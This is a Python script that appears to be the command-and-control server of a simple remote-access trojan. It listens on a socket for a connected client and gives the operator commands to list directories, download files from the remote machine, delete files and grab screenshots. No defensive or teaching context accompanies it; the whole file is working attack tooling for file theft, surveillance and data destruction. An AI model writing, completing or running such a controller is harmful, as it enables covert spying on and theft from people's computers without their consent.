import socket
import os
from PIL import Image
import threading

HOST = "172.31.3.253"
PORT = 8080
print(socket.gethostname())
s = socket.socket()
s.bind((HOST, PORT))
print("")
print("server is running ,", HOST)
print("")
print("waiting for the incoming conection")
s.listen(1)
conn, addr = s.accept()
print("")
print(addr, " has connected to server successfully")
# conection done

while 1:
    command = input(str("Command >> "))
    if command == "view_cwd":
        conn.send(command.encode())
        print("cmd send waiting for execution")
        files = conn.recv(5000)
        files = files.decode()
        print("cmd output : ", files)

    elif command == "custom_dir":
        conn.send(command.encode())
        print("")
        user_input = input(str("custome_dir : "))
        conn.send(user_input.encode())
        print("command has been sent")
        print("")
        files = conn.recv(5000)
        files = files.decode()
        print("custome dir result : ", files)
    elif command == "download_file":
        conn.send(command.encode())
        file_path = input(str("please input file path with file name"))
        conn.send(file_path.encode())
        print("cmd has been send")
        file = conn.recv(100000)
        filename = input(str("filename of incoming file for extensiom"))
        new_file = open(filename, "wb")
        new_file.write(file)
        new_file.close()
        print(filename, " Has been downloaded and saved")

    elif command == "remove_file":
        conn.send(command.encode())
        file_path = input(str("please input file path with file name"))
        conn.send(file_path.encode())
        print("cmd has been send")
        conn.send((file_path.encode()))
        print("cmd has been executed")

    elif command == "screenshot":
        conn.send(command.encode())
        print("cmd send waiting for execution")
        size = int(conn.recv(10).decode('utf-8'))
        print(size)
        the_photo = conn.recv(size)
        print(the_photo)
        print("executed")
        img_to_save = Image.frombytes("RGB", (490, 490), the_photo)
        img_to_save.save("screenshot.png")
    
    else:
        print("not recognized")
